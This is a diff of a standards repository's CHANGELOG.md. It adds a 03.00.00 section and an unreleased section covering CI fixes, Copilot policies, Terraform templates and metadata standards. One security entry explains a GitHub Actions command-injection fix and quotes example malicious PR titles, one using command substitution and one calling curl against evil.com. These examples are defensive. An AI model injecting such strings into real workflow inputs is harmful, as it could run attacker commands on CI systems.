@@ -15,13 +15,308 @@
  DEFGROUP: MokoStandards
  INGROUP: MokoStandards.Documentation
  REPO: https://github.com/mokoconsulting-tech/MokoStandards/
- VERSION: 02.00.00
+ VERSION: 03.00.00
  PATH: ./CHANGELOG.md
  BRIEF: Version history using Keep a Changelog
  NOTE: Adheres to SemVer when applicable
  -->
 
 # Changelog
+
+## [UNRELEASED]
+
+### Security
+- **Code Injection Vulnerability**: Fixed potential code injection in auto-update-changelog workflow
+  - Fixed vulnerability in `.github/workflows/auto-update-changelog.yml`
+  - User-controlled data (PR titles, descriptions) were directly interpolated in shell commands
+  - Moved all user-controlled data to environment variables (PR_TITLE, PR_NUMBER, CHANGE_TYPE, PR_USER)
+  - Prevents command injection via malicious PR titles like `"Feature $(whoami)"` or `"Update \`curl evil.com\``
+  - Fixed in Summary step (lines 246-263) and Commit step (lines 200-224)
+  - Security best practice: Always use environment variables for user-controlled data in shell contexts
+  - Impact: High-severity vulnerability eliminated without functional changes
+
+### Fixed - Critical Build and CI Issues
+- **Setuptools Package Discovery**: Fixed "multiple top-level packages" error
+  - Added proper [build-system] configuration to `pyproject.toml`
+  - Added [project] metadata section with package information
+  - Added [tool.setuptools] configuration to exclude non-package directories
+  - Explicitly excluded: schemas, terraform, templates, scripts, docs, .github
+  - These directories contain templates/configs/documentation, not Python packages
+  - Prevents setuptools from incorrectly treating them as packages
+  - Allows pip install and build operations to succeed
+- **Workflow Shell Syntax Error**: Fixed shell script syntax in workflow validation
+  - Fixed line 555 in `.github/workflows/standards-compliance.yml`
+  - Fixed line 385 in `templates/workflows/standards-compliance.yml.template`
+  - Changed from: `for workflow in .github/workflows/*.yml .github/workflows/*.yaml 2>/dev/null; do`
+  - Changed to: `for workflow in $(find .github/workflows -maxdepth 1 -type f \( -name "*.yml" -o -name "*.yaml" \) 2>/dev/null); do`
+  - Resolves "syntax error near unexpected token `2'" error
+  - Proper error suppression with find command
+  - Consistent between active workflow and template
+
+### Added - Documentation Gap Analysis and Roadmap Update
+- **Comprehensive Documentation Gap Analysis**: Performed complete repository audit
+  - Analyzed all 47 Python scripts and 5 shell scripts
+  - Identified 35 undocumented Python scripts (75% coverage gap)
+  - Identified 5 undocumented shell scripts (100% coverage gap)
+  - Found 10 documentation consolidation opportunities
+  - Discovered 7 missing or incomplete policies
+  - Identified 6 integration documentation gaps
+  - Quantified technical debt: 225-335 hours
+- **ROADMAP.md Enhancement**: Added "Known Gaps and Weaknesses" section (210+ lines)
+  - Complete list of 35 undocumented scripts by category
+  - Documentation consolidation needs (branching, testing, incident response)
+  - Policy gaps with impact assessment (testing, error handling, third-party integration)
+  - Integration documentation requirements (workflow guide, dependency graph, troubleshooting)
+  - Technical debt breakdown with effort estimates
+  - Three-phase remediation roadmap with timelines
+  - Quarterly monitoring and review procedures
+  - Updated v03.01.00 priorities with CRITICAL documentation tasks
+  - Enhanced Success Metrics with documentation coverage KPIs
+- **Quarterly Target Goals**: Established clear documentation improvement targets
+  - Q2 2026 (v03.02.00): 80% coverage, <10 undocumented scripts
+  - Q3 2026 (v03.03.00): 95% coverage, <3 undocumented scripts
+  - Q4 2026 (v03.04.00): 100% coverage, 0 undocumented scripts
+
+### Added - GitHub Copilot Documentation and Policies
+- **Copilot Pre-Merge Policy**: Created comprehensive pre-merge checklist policy
+  - Created `docs/policy/copilot-pre-merge-checklist.md` (13KB comprehensive policy)
+  - Defines 8 required pre-merge tasks with verification checklists
+  - Sample Copilot prompts for version updates, changelog generation, code review response
+  - Requirements for security scanning, code quality, documentation updates, drift detection
+  - Comprehensive pre-merge prompt template for complete validation
+  - Examples for feature branches, hotfixes, and documentation updates
+  - Automation integration guidance for CI/CD workflows
+- **Pull Request Template**: Created GitHub PR template with integrated checklist
+  - Created `.github/pull_request_template.md` (5.6KB template)
+  - Includes complete pre-merge Copilot checklist with checkboxes
+  - Sections for test results, breaking changes, deployment notes, screenshots
+  - Reviewer verification checklist
+  - Links to comprehensive policy documentation
+  - Enforces consistent PR process across organization
+- **Copilot Usage Policy**: Created comprehensive Copilot usage policy
+  - Created `docs/policy/copilot-usage-policy.md` (12.8KB policy document)
+  - Defines acceptable and prohibited uses of GitHub Copilot
+  - Security requirements and data protection guidelines
+  - Quality standards and code review requirements
+  - Governance framework with roles and responsibilities
+  - Training requirements and monitoring procedures
+  - Incident response and policy violation handling
+  - Best practices for prompt engineering and iterative refinement
+- **Copilot Usage Guide**: Created practical hands-on usage guide
+  - Created `docs/guide/copilot-usage-guide.md` (16.4KB comprehensive guide)
+  - Getting started instructions and initial setup
+  - Core features: inline completion, Copilot Chat, Copilot for CLI
+  - Effective prompt engineering principles and techniques
+  - Common use cases: boilerplate, tests, documentation, refactoring, learning
+  - Advanced techniques: multi-step prompts, context building, pattern replication
+  - Language-specific tips for Python, JavaScript/TypeScript, Go, Shell
+  - Troubleshooting guide and integration with development workflow
+  - Productivity tips, keyboard shortcuts, and quality checklists
+
+### Fixed - Documentation Drift
+- **Script Documentation**: Fixed script documentation filenames to match actual scripts
+  - Renamed `docs/scripts/lib/common-py.md` → `common.md` (matches common.py)
+  - Renamed `docs/scripts/validate/no-secrets-py.md` → `no-secrets.md` (matches no_secrets.py)
+  - Renamed `docs/scripts/maintenance/flush-actions-cache-py.md` → `flush-actions-cache.md`
+  - Renamed `docs/scripts/automation/dev-workstation-provisioner.md` → `setup-dev-environment.md`
+  - Renamed `docs/scripts/automation/guide-file-distributor.md` → `file-distributor.md`
+  - Resolves "documented but missing scripts" validation errors
+
+### Removed - Backward Compatibility
+- **Backward Compatibility Code Removed**: Cleaned up legacy support code
+  - Removed `LegacySchemaAdapter` class from `terraform_schema_reader.py`
+  - Removed deprecated `config_source` parameter from `check_repo_health.py`
+  - Removed `--config` CLI argument from repo health checker
+  - Removed deprecated workflow inputs: `joomla-versions`, `coverage-joomla-version`
+  - Removed legacy input handling code from `reusable-platform-testing.yml` and template
+  - Removed documentation for legacy `<template>` field in schema guide
+  - Removed XML format fallback in `validate_structure_v2.py`
+  - Rationale: v03.00.00 uses Terraform-based configuration exclusively
+  - Breaking Change: Scripts using old XML config format will no longer work
+  - Migration: Use Terraform .tf configuration files and new workflow input names
+
+### Fixed - Shell Script Syntax Errors
+- **Workflow Bug Fix**: Fixed shell script syntax errors in standards-compliance.yml
+  - Fixed 22 instances of unquoted variables in conditional tests
+  - All variables in `[ ]` conditionals now properly quoted (e.g., `[ "$INVALID" -gt 0 ]`)
+  - Prevents "syntax error near unexpected token" errors when variables are empty or unset
+  - Resolves CI/CD failure caused by unquoted `$INVALID` variable at line 566
+  - Improved script robustness and error handling
+  - All changes comply with shell scripting best practices
+
+### Added - Automatic Development Branch Creation
+- **Workflow Automation**: Created workflow to automatically create dev branches after PR merge
+  - Created `.github/workflows/auto-create-dev-branch.yml`
+  - Triggers on PR merge to main branch
+  - Automatically extracts current version from CHANGELOG.md or VERSION file
+  - Calculates next patch version (e.g., 03.00.00 -> 03.00.01)
+  - Creates new branch `dev/<next-version>` from main
+  - Creates tracking issue documenting the new branch
+  - Comments on merged PR with branch information
+  - Prevents duplicate branches (checks if branch already exists)
+  - Supports both zero-padded (XX.YY.ZZ) and standard semver (X.Y.Z) formats
+  - Provides workflow summary with version details
+
+### Added - Terraform Workflow Templates and Infrastructure Management
+- **Terraform Support**: Added comprehensive Terraform workflow templates
+  - Created `templates/workflows/terraform/ci.yml` - Terraform validation, formatting, planning, and security scanning
+  - Created `templates/workflows/terraform/deploy.yml.template` - Multi-cloud deployment workflows (AWS/Azure/GCP)
+  - Created `templates/workflows/terraform/drift-detection.yml.template` - Scheduled infrastructure drift monitoring
+  - Created `templates/workflows/terraform/manage-repo-templates.yml.template` - Use Terraform to manage repository templates
+  - Created `templates/workflows/terraform/index.md` - Complete documentation for Terraform workflows
+  - All workflows support OIDC authentication, security scanning (tfsec/Checkov), and automated issue creation
+- **Terraform Infrastructure Configuration**: Created repository management via Terraform
+  - Created `terraform/repository-management/main.tf` - Declarative repository file management
+  - Created `terraform/repository-management/terraform.tfvars.example` - Configuration examples
+  - Enables bulk repository updates using infrastructure-as-code principles
+- **Script Enhancement**: Updated `scripts/automation/bulk_update_repos.py` to recognize Terraform repositories
+  - Added Terraform platform detection (checks for terraform/ directory and .tf files)
+  - Added Terraform workflow template mappings (ci, deploy, drift-detection)
+  - Platform detection now prioritizes Terraform before falling back to auto-detection
+
+### Added - Terraform Override Configuration
+- **Configuration Management**: Converted override file from XML to Terraform format
+  - Created `MokoStandards.override.tf` replacing `MokoStandards.override.xml`
+  - Uses HCL locals blocks for metadata and configuration
+  - Lists exclude_files and protected_files in type-safe format
+  - Updated `scripts/automation/bulk_update_repos.py` to parse Terraform format using regex
+  - Updated `.github/workflows/bulk-repo-sync.yml` to reflect new format
+
+### Added - Comprehensive Roadmap and Planning Standards
+- **Strategic Planning**: Created 5-year version-specific roadmap
+  - Created `docs/ROADMAP.md` with detailed quarterly planning through 2030
+  - Restructured from quarter-based to version-based planning
+  - Version 03.x.x (2026): 6 minor releases planned with specific features
+  - Version 04.x.x (2027): AI Integration & Scale focus
+  - Version 05.x.x (2028): Open Source & Global Adoption
+  - Version 06.x.x (2029): Enterprise & Scale features
+  - Version 07.x.x (2030): Future Vision & AI-First
+  - Annual major versions suggested (not required), allowing flexibility based on needs
+- **Roadmap Policy**: Created comprehensive roadmap standards
+  - Created `docs/policy/roadmap-standards.md` defining roadmap planning requirements
+  - Specified version-centric planning over 5-year horizon
+  - One major version per year suggested (6-18 months acceptable)
+  - Quarterly minor releases recommended (1-6 months acceptable)
+  - Includes flexibility guidance, success metrics, and stakeholder communication standards
+
+### Added - Unified Metadata Standards Policy
+- **Comprehensive Standards**: Created unified metadata policy covering all documentation types
+  - Created `docs/policy/metadata-standards.md` as authoritative source for all metadata
+  - Covers markdown documents, Terraform configurations, YAML, JSON, and code files
+  - Defines 5 core required fields applicable to all formats
+  - **Document Type Values**: 10 defined values with detailed definitions (Policy, Guide, Checklist, Reference, Report, ADR, Template, Glossary, Index, Runbook)
+  - **Domain Values**: 10 defined values with scope descriptions (Documentation, Development, Operations, Security, Governance, Quality, Legal, Architecture, Infrastructure, Product)
+  - **Applies To Values**: 6 defined scopes (All Repositories, Organization-wide, Specific Projects, Platform-Specific, Role-Specific, Environment-Specific)
+  - **Status Values**: 7 lifecycle states (Draft, Active, Authoritative, Deprecated, Superseded, Under Review, Archived)
+  - Supersedes previous terraform-metadata-standards.md (now deprecated)
+- **Revision History Enhancement**: Added timestamp support for revision histories
+  - Three date format options: YYYY-MM-DD, YYYY-MM-DD HH:MM:SS UTC, YYYY-MM-DDTHH:MM:SSZ
+  - Guidance on when to include timestamps (required for CI/CD, recommended for frequent updates)
+  - **UTC requirement**: All timestamps MUST use UTC timezone
+  - Four complete examples showing different use cases
+- **Updated Policies**: Enhanced document-formatting.md with metadata standards
+  - Expanded allowed values for Document Type (10 values) and Domain (10 values)
+  - Cross-references unified metadata-standards.md for detailed guidance
+  - Maintains backward compatibility with existing documents
+
+### Added - UTC Timestamp Standards
+- **Timestamp Requirements**: Strengthened UTC timezone requirements across all policies
+  - **coding-style-guide.md**: Added comprehensive "Date and Time Standards" section
+    - Clear requirement: "All timestamps MUST use UTC timezone"
+    - Code examples for Python (datetime.now(timezone.utc)), JavaScript (toISOString()), and PHP (gmdate)
+    - Rationale documented: consistency, no ambiguity, compliance, interoperability
+  - **metadata-standards.md**: Enhanced UTC emphasis with IMPORTANT callout
+    - Added "Never use local timezones or ambiguous time formats" guidance
+    - Included comprehensive rationale for UTC requirement
+  - Verified all existing timestamps already comply (use "Z" suffix for UTC)
+
+### Fixed - Documentation Version Drift
+- **Version Consistency**: Fixed 7 documentation files with outdated VERSION fields
+  - Updated VERSION from 01.00.00 to 03.00.00 in file headers:
+    - docs/policy/metadata-standards.md
+    - docs/policy/terraform-metadata-standards.md
+    - docs/policy/merge-strategy.md
+    - docs/policy/waas/perfectpublisher-content-approval-and-cadence.md
+    - docs/guide/conflict-resolution.md
+    - docs/guide/branch-synchronization.md
+    - docs/ROADMAP.md
+  - Ensures version consistency across entire repository
+
+### Changed - File Header Standards Update
+- **Documentation Standards**: Updated file-header-standards.md to clarify warranty disclaimer requirements
+  - Warranty disclaimer is now **suggested** rather than required in file headers
+  - Added distinction between "Minimal Header" (required elements only) and "Full Header" (with suggested warranty disclaimer)
+  - Required elements: Copyright, project membership, SPDX identifier, basic GPL license terms
+  - Suggested elements: Full GPL license text including warranty disclaimer
+  - Added guidance on when to use each header type
+  - Updated all file type examples (Markdown, Python, PHP, Shell, YAML) to show both minimal and full variants
+  - **Exception - REQUIRED warranty disclaimer** for specific file types:
+    - **index.php files** (directory protection) - Must include full GPL header
+    - **README files** (user-facing) - Warranty text as visible content, not comment
+    - **Dolibarr module descriptor files** - Full GPL header required
+    - **Joomla extension XML files** - Warranty text in description section
+  - Updated templates/security/index.php with full warranty disclaimer
+  - Updated templates/docs/required/template-README.md with visible warranty text
+
+### Changed - Metadata Updates
+- **Documentation Standardization**: Updated metadata sections across 129 documentation files
+  - Applied standardized 11-field metadata tables
+  - Updated all revision history sections to proper format
+  - Set consistent version (03.00.00) and review dates (2026-01-28)
+  - Assigned appropriate document types and domains based on file paths
+
+### Changed - Indentation Policy Clarification
+- **Documentation Standards**: Updated coding and scripting standards to clarify tabs-over-spaces policy
+  - Updated `docs/policy/coding-style-guide.md` to specify tabs as MokoStandards default
+    - Changed "Use spaces, not tabs" to "Use tabs, not spaces"
+    - Added explicit exceptions for YAML (spec requires spaces) and Makefiles (spec requires tabs)
+    - Updated .editorconfig example to show tabs as default with proper exceptions
+  - Updated `docs/policy/scripting-standards.md` to add Code Formatting section
+    - Explicitly states: "Use tabs, not spaces (MokoStandards standard)"
+    - Clarifies tab width of 2 spaces for visual display
+    - Documents YAML exception (must use spaces per specification)
+  - Aligns policy documentation with existing `.editorconfig` which already specified tabs
+  - Resolves previous contradiction where `.editorconfig` used tabs but policy docs said spaces
+
+## [03.00.00] - 2026-01-28
+
+### Changed - Major Version: Repository Standards and Documentation Improvements
+- **BREAKING CHANGE**: Version bumped from 02.00.00 to 03.00.00 across entire repository
+  - Updated 156 files with 344 version number replacements
+  - All documentation, scripts, and configuration files now use version 03.00.00
+
+### Changed - Revision History Order
+- **Documentation Standards**: Updated revision history and changelog ordering
+  - Updated `docs/policy/document-formatting.md` to specify **descending chronological order** (newest first, oldest last)
+  - Fixed revision history tables in multiple files to follow descending order:
+    - `templates/index.md` - Reversed 4 revision entries
+    - `templates/workflows/README.md` - Reversed 3 revision history entries and 3 version history entries
+    - `CONTRIBUTING.md` - Reversed 2 revision entries
+    - `README.md` - Reversed 2 revision entries
+  - Aligns with industry standard changelog practices (Keep a Changelog format)
+  - Makes most recent changes immediately visible to readers
+
+### Fixed - Standards Compliance
+- Removed `tests/` directory from required directories check
+  - Updated `.github/workflows/standards-compliance.yml` to check only `docs`, `scripts`, and `.github` directories
+  - Updated `docs/quickstart/repository-startup-guide.md` to make tests/ optional
+  - MokoStandards itself doesn't require a tests/ directory
+
+### Changed - Tab/Space Configuration
+- **Indentation Standards**: Clarified tab usage across file types
+  - Updated `.editorconfig`: Tabs for all files except YAML (which requires spaces per spec)
+  - Updated `.markdownlint.json`: Disabled MD010 to allow tabs in markdown files
+  - Restored tab characters in 12 markdown files that were incorrectly converted to spaces
+
+### Added - Security Documentation
+- Created comprehensive confidentiality scan documentation
+  - Added `docs/policy/security/confidentiality-scan.md` with detailed workflow documentation
+  - Updated `docs/policy/security/index.md` to include new documentation
+  - Documents scan types, patterns, exclusions, and remediation procedures
+
+### Added - Markdown Linting
+- Created `.markdownlint.json` configuration for markdown standards
+- Updated `.editorconfig` with explicit markdown file configuration
 
 ## [02.00.00] - 2026-01-28
 ### Changed - Major Version: Standardized Metadata and Terraform Migration
@@ -95,8 +390,6 @@
 - Updated `scripts/docs/rebuild_indexes.py` - Auto-index tool with new revision history
 - All 127 documentation files updated with standardized metadata
 - Comprehensive Terraform schema documentation added
-
-## [UNRELEASED]
 
 ## [07.00.00] - 2026-01-13
 ### Added - Golden Architecture & Organizational Standards
